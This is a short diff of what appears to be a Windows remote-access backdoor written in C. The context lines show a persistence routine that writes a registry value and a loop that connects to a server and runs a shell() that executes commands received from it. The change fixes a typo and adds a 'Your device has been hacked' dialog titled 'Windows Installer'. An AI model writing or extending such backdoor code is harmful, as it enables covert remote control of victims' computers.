@@ -42,7 +42,7 @@ int bootRun() {
     return -1;
   }
   RegCloseKey(NewVal);
-  send(sock, suc, sizeof(suc), 0)l
+  send(sock, suc, sizeof(suc), 0);
   return 0;
 }
 
@@ -168,6 +168,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     Sleep(10);
     goto start; // goto - start function
   }
-
+  // dialog for notifying hack
+  MessageBox(NULL, TEXT("Your device has been hacked"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
   shell(); // receive commands from the server , execute it and send the result
 }
